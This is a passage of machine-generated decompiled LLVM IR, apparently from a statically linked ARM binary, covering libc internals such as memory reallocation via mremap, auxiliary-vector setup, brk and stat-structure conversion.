  store i32 %v4_1c29c, i32* %v4_1c2a0, align 4
  %v1_1c2a4 = load i32, i32* @r5, align 4
  %v2_1c2a4 = add i32 %v1_1c2a4, 32
  %v3_1c2a4 = inttoptr i32 %v2_1c2a4 to i32*
  %v4_1c2a4 = load i32, i32* %v3_1c2a4, align 4
  store i32 %v4_1c2a4, i32* %r3.global-to-local, align 4
  %v2_1c2a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1c2a8 = add i32 %v2_1c2a8, 32
  %v4_1c2a8 = inttoptr i32 %v3_1c2a8 to i32*
  store i32 %v4_1c2a4, i32* %v4_1c2a8, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1c288, %dec_label_pc_1c270, %dec_label_pc_1c250, %dec_label_pc_1c244, %bb32
  %v0_1c2ac = load i32, i32* @r5, align 4
  store i32 %v0_1c2ac, i32* @r0, align 4
  %v0_1c2b0 = call i32 @free()
  store i32 %v0_1c2b0, i32* %r0.global-to-local, align 4
  %v0_1c2b4 = load i32, i32* @r7, align 4
  %v1_1c2b4 = add i32 %v0_1c2b4, 8
  store i32 %v1_1c2b4, i32* @r4, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c2bc:                               ; preds = %bb30, %.thread2, %dec_label_pc_1c1fc
  %v0_1c2d0 = phi i32 [ %v3_1c22c, %.thread2 ], [ %v1_1c144, %bb30 ], [ %v1_1c2bc.pre, %dec_label_pc_1c1fc ]
  %v0_1c2bc = load i32, i32* @sb, align 4
  %v2_1c2bc = sub i32 %v0_1c2d0, %v0_1c2bc
  store i32 %v2_1c2bc, i32* %r1.global-to-local, align 4
  %v0_1c2c4 = load i32, i32* @sl, align 4
  %v1_1c2c4 = add i32 %v0_1c2c4, 4
  %v2_1c2c4 = inttoptr i32 %v1_1c2c4 to i32*
  %v3_1c2c4 = load i32, i32* %v2_1c2c4, align 4
  %tmp41 = icmp ugt i32 %v2_1c2bc, 15
  %v1_1c2ec = urem i32 %v3_1c2c4, 2
  store i32 %v1_1c2ec, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_1c2ec, label %dec_label_pc_1c2cc

dec_label_pc_1c2cc:                               ; preds = %dec_label_pc_1c2bc
  %v2_1c2d0 = or i32 %v1_1c2ec, %v0_1c2d0
  store i32 %v2_1c2d0, i32* %r3.global-to-local, align 4
  store i32 %v2_1c2d0, i32* %v2_1c2c4, align 4
  %v0_1c2d8 = load i32, i32* @sl, align 4
  %v1_1c2d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c2d8 = add i32 %v1_1c2d8, %v0_1c2d8
  store i32 %v2_1c2d8, i32* %r2.global-to-local, align 4
  %v1_1c2dc = add i32 %v2_1c2d8, 4
  %v2_1c2dc = inttoptr i32 %v1_1c2dc to i32*
  %v3_1c2dc = load i32, i32* %v2_1c2dc, align 4
  %v1_1c2e0 = or i32 %v3_1c2dc, 1
  store i32 %v1_1c2e0, i32* %r3.global-to-local, align 4
  store i32 %v1_1c2e0, i32* %v2_1c2dc, align 4
  br label %dec_label_pc_1c31c

dec_label_pc_1c2ec:                               ; preds = %dec_label_pc_1c2bc
  %v2_1c2f0 = add i32 %v0_1c2c4, %v0_1c2bc
  store i32 %v2_1c2f0, i32* %r0.global-to-local, align 4
  %v2_1c2f4 = or i32 %v1_1c2ec, %v0_1c2bc
  store i32 %v2_1c2f4, i32* %r3.global-to-local, align 4
  %v1_1c2f8 = or i32 %v2_1c2bc, 1
  store i32 %v1_1c2f8, i32* %r2.global-to-local, align 4
  store i32 %v2_1c2f4, i32* %v2_1c2c4, align 4
  %v0_1c300 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c300 = load i32, i32* %r0.global-to-local, align 4
  %v2_1c300 = add i32 %v1_1c300, 4
  %v3_1c300 = inttoptr i32 %v2_1c300 to i32*
  store i32 %v0_1c300, i32* %v3_1c300, align 4
  %v0_1c304 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c304 = load i32, i32* %r1.global-to-local, align 4
  %v2_1c304 = add i32 %v1_1c304, %v0_1c304
  store i32 %v2_1c304, i32* %r2.global-to-local, align 4
  %v1_1c308 = add i32 %v2_1c304, 4
  %v2_1c308 = inttoptr i32 %v1_1c308 to i32*
  %v3_1c308 = load i32, i32* %v2_1c308, align 4
  %v1_1c30c = or i32 %v3_1c308, 1
  store i32 %v1_1c30c, i32* %r3.global-to-local, align 4
  store i32 %v1_1c30c, i32* %v2_1c308, align 4
  %v0_1c314 = load i32, i32* %r0.global-to-local, align 4
  %v1_1c314 = add i32 %v0_1c314, 8
  store i32 %v1_1c314, i32* @r0, align 4
  %v0_1c318 = call i32 @free()
  store i32 %v0_1c318, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c31c

dec_label_pc_1c31c:                               ; preds = %dec_label_pc_1c2cc, %dec_label_pc_1c2ec
  %v0_1c31c = load i32, i32* @sl, align 4
  %v1_1c31c = add i32 %v0_1c31c, 8
  store i32 %v1_1c31c, i32* @r4, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c324:                               ; preds = %bb29
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r1.global-to-local, align 4
  %v4_1c32c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_1c32c, i32* @r8, align 4
  %v2_1c330 = inttoptr i32 %v1_1c140 to i32*
  %v3_1c330 = load i32, i32* %v2_1c330, align 4
  store i32 %v3_1c330, i32* @r4, align 4
  %v1_1c334 = add i32 %v4_1c32c, 860
  %v2_1c334 = inttoptr i32 %v1_1c334 to i32*
  %v3_1c334 = load i32, i32* %v2_1c334, align 4
  %v1_1c338 = add i32 %v3_1c330, 4
  %v1_1c33c = add i32 %v3_1c334, -1
  store i32 %v1_1c33c, i32* %r2.global-to-local, align 4
  %v2_1c340 = add i32 %v1_1c338, %v1_1c33c
  %v1_1c344 = load i32, i32* @sb, align 4
  %v2_1c344 = add i32 %v2_1c340, %v1_1c344
  store i32 %v2_1c344, i32* %r3.global-to-local, align 4
  %v2_1c348 = sub i32 0, %v3_1c334
  %v3_1c348 = and i32 %v2_1c344, %v2_1c348
  store i32 %v3_1c348, i32* @r7, align 4
  %v2_1c34c = sub i32 %v3_1c348, %v3_1c330
  store i32 %v2_1c34c, i32* @fp, align 4
  %v9_1c350 = icmp eq i32 %v1_1c144, %v2_1c34c
  br i1 %v9_1c350, label %dec_label_pc_1c3c4, label %dec_label_pc_1c358

dec_label_pc_1c358:                               ; preds = %dec_label_pc_1c324
  %v2_1c358 = sub i32 %v1_1c140, %v3_1c330
  store i32 %v2_1c358, i32* %r0.global-to-local, align 4
  %v2_1c35c = add i32 %v3_1c330, %v1_1c144
  store i32 %v2_1c35c, i32* %r1.global-to-local, align 4
  store i32 %v3_1c348, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1c368 = call i32 @mremap(i32 %v2_1c358, i32 %v2_1c35c, i32 %v3_1c348, i32 1)
  store i32 %v4_1c368, i32* %r0.global-to-local, align 4
  %v7_1c36c = icmp eq i32 %v4_1c368, -1
  br i1 %v7_1c36c, label %dec_label_pc_1c3b8, label %dec_label_pc_1c374

dec_label_pc_1c374:                               ; preds = %dec_label_pc_1c358
  %v1_1c374 = load i32, i32* @r4, align 4
  %v2_1c374 = add i32 %v1_1c374, %v4_1c368
  store i32 %v2_1c374, i32* %r0.global-to-local, align 4
  %v0_1c378 = load i32, i32* @fp, align 4
  %v1_1c378 = or i32 %v0_1c378, 2
  store i32 %v1_1c378, i32* %r3.global-to-local, align 4
  %v2_1c37c = add i32 %v2_1c374, 4
  %v3_1c37c = inttoptr i32 %v2_1c37c to i32*
  store i32 %v1_1c378, i32* %v3_1c37c, align 4
  %v0_1c380 = load i32, i32* @r8, align 4
  %v1_1c380 = add i32 %v0_1c380, 868
  %v2_1c380 = inttoptr i32 %v1_1c380 to i32*
  %v3_1c380 = load i32, i32* %v2_1c380, align 4
  store i32 %v3_1c380, i32* %r3.global-to-local, align 4
  %v1_1c384 = add i32 %v0_1c380, 880
  %v2_1c384 = inttoptr i32 %v1_1c384 to i32*
  %v3_1c384 = load i32, i32* %v2_1c384, align 4
  store i32 %v3_1c384, i32* %r2.global-to-local, align 4
  %v0_1c388 = load i32, i32* @r6, align 4
  %v2_1c388 = sub i32 %v3_1c380, %v0_1c388
  store i32 %v2_1c388, i32* %r3.global-to-local, align 4
  %v1_1c38c = load i32, i32* @r7, align 4
  %v2_1c38c = add i32 %v1_1c38c, %v2_1c388
  store i32 %v2_1c38c, i32* %r1.global-to-local, align 4
  %v1_1c390 = add i32 %v0_1c380, 872
  %v2_1c390 = inttoptr i32 %v1_1c390 to i32*
  %v3_1c390 = load i32, i32* %v2_1c390, align 4
  store i32 %v3_1c390, i32* %r3.global-to-local, align 4
  %v1_1c398 = add i32 %v0_1c380, 884
  %v2_1c398 = inttoptr i32 %v1_1c398 to i32*
  %v3_1c398 = load i32, i32* %v2_1c398, align 4
  store i32 %v3_1c398, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1c38c, %v3_1c384
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_1c374
  store i32 %v2_1c38c, i32* %v2_1c384, align 4
  %v0_1c3a0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1c3a0.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_1c374, %bb33
  %v1_1c3a0 = phi i32 [ %v0_1c380, %dec_label_pc_1c374 ], [ %v1_1c3a0.pre, %bb33 ]
  %v0_1c3a0 = phi i32 [ %v2_1c38c, %dec_label_pc_1c374 ], [ %v0_1c3a0.pre, %bb33 ]
  %v2_1c3a0 = add i32 %v1_1c3a0, 868
  %v3_1c3a0 = inttoptr i32 %v2_1c3a0 to i32*
  store i32 %v0_1c3a0, i32* %v3_1c3a0, align 4
  %v0_1c3a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1c3a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_1c3a4 = add i32 %v1_1c3a4, %v0_1c3a4
  store i32 %v2_1c3a4, i32* %r1.global-to-local, align 4
  %v1_1c3a8 = load i32, i32* %r2.global-to-local, align 4
  %v0_1c3ac = load i32, i32* %r0.global-to-local, align 4
  %v1_1c3ac = add i32 %v0_1c3ac, 8
  store i32 %v1_1c3ac, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_1c3a4, %v1_1c3a8
  br i1 %tmp43, label %bb35, label %dec_label_pc_1c3f0

bb35:                                             ; preds = %bb34
  %v5_1c3b0 = load i32, i32* @r8, align 4
  %v6_1c3b0 = add i32 %v5_1c3b0, 884
  %v7_1c3b0 = inttoptr i32 %v6_1c3b0 to i32*
  store i32 %v2_1c3a4, i32* %v7_1c3b0, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c3b8:                               ; preds = %dec_label_pc_1c358
  %v0_1c3b8 = load i32, i32* @sb, align 4
  %v1_1c3b8 = add i32 %v0_1c3b8, 4
  store i32 %v1_1c3b8, i32* %r3.global-to-local, align 4
  %v0_1c3bc = load i32, i32* @r6, align 4
  %v3_1c3bc = icmp ult i32 %v0_1c3bc, %v1_1c3b8
  br i1 %v3_1c3bc, label %dec_label_pc_1c3cc, label %dec_label_pc_1c3b8.dec_label_pc_1c3c4_crit_edge

dec_label_pc_1c3b8.dec_label_pc_1c3c4_crit_edge:  ; preds = %dec_label_pc_1c3b8
  %v0_1c3c4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1c3c4

dec_label_pc_1c3c4:                               ; preds = %dec_label_pc_1c3b8.dec_label_pc_1c3c4_crit_edge, %dec_label_pc_1c324
  %v0_1c3c4 = phi i32 [ %v0_1c3c4.pre, %dec_label_pc_1c3b8.dec_label_pc_1c3c4_crit_edge ], [ %v0_1c12c, %dec_label_pc_1c324 ]
  store i32 %v0_1c3c4, i32* @r4, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c3cc:                               ; preds = %dec_label_pc_1c3b8
  %v1_1c3cc = add i32 %v0_1c3b8, -7
  store i32 %v1_1c3cc, i32* %r0.global-to-local, align 4
  %v1_1c3d0 = call i32 @malloc(i32 %v1_1c3cc)
  store i32 %v1_1c3d0, i32* @r0, align 4
  store i32 %v1_1c3d0, i32* @r4, align 4
  %v2_1c3d4 = icmp eq i32 %v1_1c3d0, 0
  br i1 %v2_1c3d4, label %dec_label_pc_1c3f0, label %dec_label_pc_1c3dc

dec_label_pc_1c3dc:                               ; preds = %dec_label_pc_1c3cc
  %v0_1c3dc = load i32, i32* @r6, align 4
  %v1_1c3dc = add i32 %v0_1c3dc, -8
  store i32 %v1_1c3dc, i32* @r2, align 4
  %v0_1c3e0 = load i32, i32* @r5, align 4
  store i32 %v0_1c3e0, i32* @r1, align 4
  %v0_1c3e4 = call i32 @memcpy()
  %v0_1c3e8 = load i32, i32* @r5, align 4
  store i32 %v0_1c3e8, i32* @r0, align 4
  %v0_1c3ec = call i32 @free()
  store i32 %v0_1c3ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1c3f0

dec_label_pc_1c3f0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1c3cc, %dec_label_pc_1c3c4, %dec_label_pc_1c31c, %.thread6, %dec_label_pc_1c18c, %dec_label_pc_1c3dc
  store i32 %v2_1c0e0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v4_1c400 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 28) to i32*), align 4
  store i32 %v4_1c400, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1c400)
  br label %dec_label_pc_1c40c

dec_label_pc_1c40c:                               ; preds = %dec_label_pc_1c114, %dec_label_pc_1c0bc, %dec_label_pc_1c0a4, %dec_label_pc_1c3f0
  %v0_1c40c = load i32, i32* @r4, align 4
  store i32 %v0_1c40c, i32* %r0.global-to-local, align 4
  store i32 %v3_1c084, i32* @r4, align 4
  store i32 %v6_1c084, i32* @r5, align 4
  store i32 %v9_1c084, i32* @r6, align 4
  store i32 %v12_1c084, i32* @r7, align 4
  store i32 %v15_1c084, i32* @r8, align 4
  store i32 %v18_1c084, i32* @sb, align 4
  store i32 %v21_1c084, i32* @sl, align 4
  store i32 %v24_1c084, i32* @fp, align 4
  store i32 %v27_1c084, i32* @lr, align 4
  ret i32 %v0_1c40c

; uselistorder directives
  uselistorder i32 %v2_1c3a4, { 1, 0, 2 }
  uselistorder i32 %v2_1c38c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1c368, { 1, 0, 2 }
  uselistorder i32 %v3_1c348, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1c2ec, { 2, 1, 0 }
  uselistorder i32 %v2_1c2bc, { 1, 0, 2 }
  uselistorder i32 %v0_1c250, { 1, 0 }
  uselistorder i32 %v1_1c20c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1c170, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1c168, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1c14c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_1c144, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1c140, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1c130, { 1, 0 }
  uselistorder i32 %v0_1c12c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1c10c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32 ()* @abort, { 6, 2, 1, 5, 4, 3, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 20) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 76) to i32*), { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_1c40c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1c3f0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_1c31c, { 1, 0 }
  uselistorder label %dec_label_pc_1c2bc, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1c208, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1c1fc, { 1, 0 }
  uselistorder label %dec_label_pc_1c1f8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1c420(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c420:
  %v0_1c420 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c420, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1c420
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1c420, %bb
  %v10_1c434 = phi i32 [ %arg1, %dec_label_pc_1c420 ], [ 0, %bb ]
  ret i32 %v10_1c434

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r2.global-to-local, align 4
  %v4_1c444 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 112) to i32*), align 4
  %v4_1c44c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 72) to i32*), align 4
  store i32 %v4_1c44c, i32* %r1.global-to-local, align 4
  %v1_1c450 = add i32 %arg1, 44
  %v2_1c450 = inttoptr i32 %v1_1c450 to i32*
  %v3_1c450 = load i32, i32* %v2_1c450, align 4
  %v1_1c454 = add i32 %arg1, 28
  %v2_1c454 = inttoptr i32 %v1_1c454 to i32*
  %v3_1c454 = load i32, i32* %v2_1c454, align 4
  store i32 %v3_1c454, i32* %r2.global-to-local, align 4
  %v2_1c458 = inttoptr i32 %v4_1c444 to i32*
  store i32 %v3_1c450, i32* %v2_1c458, align 4
  %v0_1c45c = load i32, i32* %r2.global-to-local, align 4
  %v1_1c45c = load i32, i32* %r1.global-to-local, align 4
  %v2_1c45c = inttoptr i32 %v1_1c45c to i32*
  store i32 %v0_1c45c, i32* %v2_1c45c, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 112, { 2, 3, 6, 0, 7, 4, 1, 8, 5 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_1c468(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c468:
  %v0_1c468 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1c468, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c468
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c468, %bb
  %v4_1c46c = phi i32 [ %arg1, %dec_label_pc_1c468 ], [ 0, %bb ]
  ret i32 %v4_1c46c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_1c4ac:
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r2, align 4
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 26356) to i32*), align 4
  ret i32 0
}

define i32 @__aeabi_unwind_cpp_pr0() local_unnamed_addr {
entry:
  %v1_1c4bc = load i32, i32* @r0, align 4
  ret i32 %v1_1c4bc
}

define i32 @__aeabi_unwind_cpp_pr1() local_unnamed_addr {
entry:
  %v1_1c4c0 = load i32, i32* @r0, align 4
  ret i32 %v1_1c4c0
}

define i32 @__aeabi_unwind_cpp_pr2() local_unnamed_addr {
entry:
  %v1_1c4c4 = load i32, i32* @r0, align 4
  ret i32 %v1_1c4c4
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1c4d0 = load i32, i32* @r1, align 4
  store i32 %v0_1c4d0, i32* @r3, align 4
  %v0_1c4e0 = load i32, i32* @r0, align 4
  store i32 %v0_1c4e0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1c4e0, -4095
  br i1 %tmp, label %dec_label_pc_1c500, label %dec_label_pc_1c4ec

dec_label_pc_1c4ec:                               ; preds = %entry
  %v0_1c4ec = call i32 @__GI___errno_location()
  %v0_1c4f0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c4f0 = sub i32 0, %v0_1c4f0
  store i32 %v1_1c4f0, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1c4f8 = inttoptr i32 %v0_1c4ec to i32*
  store i32 %v1_1c4f0, i32* %v2_1c4f8, align 4
  br label %dec_label_pc_1c510

dec_label_pc_1c500:                               ; preds = %entry
  %v2_1c500 = icmp eq i32 %v0_1c4e0, 0
  br i1 %v2_1c500, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1c500
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1c500, %bb
  call void @__pseudo_cond_branch(i1 %v2_1c500, i32 ptrtoint (i32* @global_var_1c698.1654 to i32))
  br label %dec_label_pc_1c510

dec_label_pc_1c510:                               ; preds = %dec_label_pc_1c4ec, %.thread
  %v0_1c510 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1c510

; uselistorder directives
  uselistorder i32 %v0_1c4e0, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1c510, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1c520 = load i32, i32* @r4, align 4
  store i32 %v3_1c520, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_1c538 = inttoptr i32 %arg2 to i8*
  %v3_1c538 = call i32 @__GI_memset(i8* %v2_1c538, i32 0)
  %v2_1c53c = load i32, i32* %arg1, align 4
  store i32 %v2_1c53c, i32* %r3.global-to-local, align 4
  %v3_1c53c = add i32 %tmp, 4
  %v4_1c53c = inttoptr i32 %v3_1c53c to i32*
  %v5_1c53c = load i32, i32* %v4_1c53c, align 4
  store i32 %v5_1c53c, i32* %r4.global-to-local, align 4
  %v0_1c540 = load i32, i32* %r5.global-to-local, align 4
  %v1_1c540 = inttoptr i32 %v0_1c540 to i32*
  store i32 %v2_1c53c, i32* %v1_1c540, align 4
  %v3_1c540 = add i32 %v0_1c540, 4
  %v4_1c540 = inttoptr i32 %v3_1c540 to i32*
  %v5_1c540 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1c540, i32* %v4_1c540, align 4
  %v0_1c544 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c544 = add i32 %v0_1c544, 12
  %v2_1c544 = inttoptr i32 %v1_1c544 to i32*
  %v3_1c544 = load i32, i32* %v2_1c544, align 4
  %v1_1c548 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c548 = add i32 %v1_1c548, 12
  %v3_1c548 = inttoptr i32 %v2_1c548 to i32*
  store i32 %v3_1c544, i32* %v3_1c548, align 4
  %v0_1c54c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c54c = add i32 %v0_1c54c, 96
  store i32 %v1_1c54c, i32* %r3.global-to-local, align 4
  %v1_1c550 = inttoptr i32 %v1_1c54c to i32*
  %v2_1c550 = load i32, i32* %v1_1c550, align 4
  store i32 %v2_1c550, i32* %r3.global-to-local, align 4
  %v3_1c550 = add i32 %v0_1c54c, 100
  %v4_1c550 = inttoptr i32 %v3_1c550 to i32*
  %v5_1c550 = load i32, i32* %v4_1c550, align 4
  store i32 %v5_1c550, i32* %r4.global-to-local, align 4
  %v1_1c554 = add i32 %v0_1c54c, 56
  %v2_1c554 = inttoptr i32 %v1_1c554 to i32*
  %v3_1c554 = load i32, i32* %v2_1c554, align 4
  store i32 %v3_1c554, i32* %r2.global-to-local, align 4
  %v1_1c558 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c558 = add i32 %v1_1c558, 96
  %v3_1c558 = inttoptr i32 %v2_1c558 to i32*
  store i32 %v2_1c550, i32* %v3_1c558, align 4
  %v0_1c55c = load i32, i32* %r4.global-to-local, align 4
  %v1_1c55c = load i32, i32* %r5.global-to-local, align 4
  %v2_1c55c = add i32 %v1_1c55c, 100
  %v3_1c55c = inttoptr i32 %v2_1c55c to i32*
  store i32 %v0_1c55c, i32* %v3_1c55c, align 4
  %v0_1c560 = load i32, i32* %r6.global-to-local, align 4
  %v1_1c560 = add i32 %v0_1c560, 24
  store i32 %v1_1c560, i32* %ip.global-to-local, align 4
  %v1_1c564 = inttoptr i32 %v1_1c560 to i32*
  %v2_1c564 = load i32, i32* %v1_1c564, align 4
  store i32 %v2_1c564, i32* %ip.global-to-local, align 4
  %v3_1c564 = add i32 %v0_1c560, 28
  %v4_1c564 = inttoptr i32 %v3_1c564 to i32*
  %v5_1c564 = load i32, i32* %v4_1c564, align 4
  store i32 %v5_1c564, i32* %lr.global-to-local, align 4
  %v0_1c568 = load i32, i32* %r2.global-to-local, align 4
  %v1_1c568 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c568 = add i32 %v1_1c568, 56
  %v3_1c568 = inttoptr i32 %v2_1c568 to i32*
  store i32 %v0_1c568, i32* %v3_1c568, align 4
  %v0_1c56c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c56c = add i32 %v0_1c56c, 72
  store i32 %v1_1c56c, i32* %r3.global-to-local, align 4
  %v1_1c570 = add i32 %v0_1c56c, 32
  store i32 %v1_1c570, i32* %r7.global-to-local, align 4
  %v1_1c574 = inttoptr i32 %v1_1c570 to i32*
  %v2_1c574 = load i32, i32* %v1_1c574, align 4
  store i32 %v2_1c574, i32* %r7.global-to-local, align 4
  %v3_1c574 = add i32 %v0_1c56c, 36
  %v4_1c574 = inttoptr i32 %v3_1c574 to i32*
  %v5_1c574 = load i32, i32* %v4_1c574, align 4
  store i32 %v5_1c574, i32* %r8.global-to-local, align 4
  %v1_1c578 = inttoptr i32 %v1_1c56c to i32*
  %v2_1c578 = load i32, i32* %v1_1c578, align 4
  %v3_1c578 = add i32 %v0_1c56c, 76
  %v4_1c578 = inttoptr i32 %v3_1c578 to i32*
  %v5_1c578 = load i32, i32* %v4_1c578, align 4
  store i32 %v5_1c578, i32* %r1.global-to-local, align 4
  %v0_1c57c = load i32, i32* %r5.global-to-local, align 4
  %v1_1c57c = add i32 %v0_1c57c, 72
  %v1_1c580 = inttoptr i32 %v1_1c57c to i32*
  store i32 %v2_1c578, i32* %v1_1c580, align 4
  %v3_1c580 = add i32 %v0_1c57c, 76
  %v4_1c580 = inttoptr i32 %v3_1c580 to i32*
  %v5_1c580 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1c580, i32* %v4_1c580, align 4
  %v0_1c584 = load i32, i32* %r7.global-to-local, align 4
  %v1_1c584 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c584 = add i32 %v1_1c584, 32
  %v3_1c584 = inttoptr i32 %v2_1c584 to i32*
  store i32 %v0_1c584, i32* %v3_1c584, align 4
  %v0_1c588 = load i32, i32* %r8.global-to-local, align 4
  %v1_1c588 = load i32, i32* %r5.global-to-local, align 4
  %v2_1c588 = add i32 %v1_1c588, 36
  %v3_1c588 = inttoptr i32 %v2_1c588 to i32*
  store i32 %v0_1c588, i32* %v3_1c588, align 4
  %v0_1c58c = load i32, i32* %r6.global-to-local, align 4
  %v1_1c58c = add i32 %v0_1c58c, 80
